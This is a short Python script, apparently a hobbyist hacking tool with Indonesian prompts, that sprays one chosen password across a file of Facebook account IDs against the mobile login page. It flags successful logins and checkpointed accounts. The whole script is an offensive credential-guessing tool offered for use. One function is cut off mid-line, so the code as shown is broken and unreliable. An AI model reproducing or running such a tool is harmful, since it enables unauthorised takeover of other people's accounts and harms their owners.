#!/usr/bin/python
# -*- coding: utf-8 -*-
from requests import Session
import sys,time

def ketik(teks):
    for i in teks + "\n":
      sys.stdout.write(i)
      sys.stdout.flush()
      time.sleep(0.1)
   
ketik("=======================================================================         SIMPLE MULTI BRUTEFORCE FACEBOOK | AUTHOR: DEDE ANDRII        =======================================================================")

def menu():
    print(""" TOOLS MENU ""
[1]> Simple Multi BruteForce
[2]> Mengambil ID Grup Facebook
[3]> Keluar""")


def asu():
    a=input("Masukan Alamat File ID:")
    b=input("Kata Sandi:")
    pas=open(a).read()
    for email in pas.splitlines():

        r = Session()
        data = {
            "email":email,
            "pass":b,
        }
        url = ("https://m.facebook.com/login.php")
        headers = {
"User-Agent":"Opera/9.80 (Android 4.4.4; Linux; Opera Mobi/ADR-1411061201) Presto/2.11.355 Version/12.10",
        }
        p = r.post(url, data=data)
        if "home.php" in p.url:

            print("[OK] ",email," | ",b)

        elif "checkpoint" in p.url:

            print("[CP] ",email," | ",b)

def tot():
       a=
menu()

pilih = input("Pilih Tools: ")
if pilih =="1":
         asu()
else:
    print(" Masukin Yang Bener Bego! ")
back = menu()